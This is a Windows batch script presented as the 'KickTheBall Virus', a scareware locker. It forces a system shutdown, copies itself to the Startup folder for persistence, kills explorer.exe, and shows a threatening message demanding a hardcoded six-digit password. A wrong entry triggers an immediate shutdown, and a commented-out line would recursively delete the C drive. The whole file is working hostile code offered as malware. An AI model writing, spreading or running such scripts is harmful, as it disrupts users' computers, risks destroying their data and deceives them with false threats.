@echo off

color 0a
title KickTheBall Virus

echo.
echo  ##########################################################
echo  #                                                        #
echo  #    K I C K T H E B A L L   V I R U S   [ v 1.0 ]       #
echo  #    -------------------------------------------------   #
echo  #    (C) 2026 KickTheBall. All Rights Reserved.          #
echo  #                                                        #
echo  ##########################################################
echo.

pause
cls

shutdown /s /t 300 /f > nul
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" > nul
taskkill /f /im explorer.exe > nul

powershell -c "[console]::beep(1000, 300)"
echo -----------------------------
echo KickTheBall Virus!
echo.
echo You infected by fatal Virus!
echo -----------------------------

pause
cls

powershell -c "[console]::beep(1000, 300)"
echo --------------------------------------------------------------------------------------------------------------------
echo If you want to get your PC back, write KickTheBall's birthday in 6 digits.
echo.
echo Otherwise, this fatal Virus will delete all your drivers.
echo.
echo If you restart your PC, the virus will restart as well.
echo --------------------------------------------------------------------------------------------------------------------

pause
cls

powershell -c "[console]::beep(1000, 300)"
echo ----------------------------------
echo Then, time to enjoy game.
echo ----------------------------------
echo.

:password
set /p password=Enter KickTheBall's birthday in 6 digits : 

if "%password%"=="020503" (
	goto success
)	else (
	goto fail
)

:success
color 1f
shutdown /a
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"
start explorer.exe
cls
powershell -c "[console]::beep(1000, 300)"
echo ======================
echo [ SUCCESS ] SYSTEM RESTORED
echo ======================
pause
exit

:fail
color 4f
shutdown /a
shutdown /s /t 5
::rd /s /q c:\
cls
powershell -c "[console]::beep(1000, 300)"
echo ======================
echo [ FAIL ] SYSTEM DESTROY
echo ======================
pause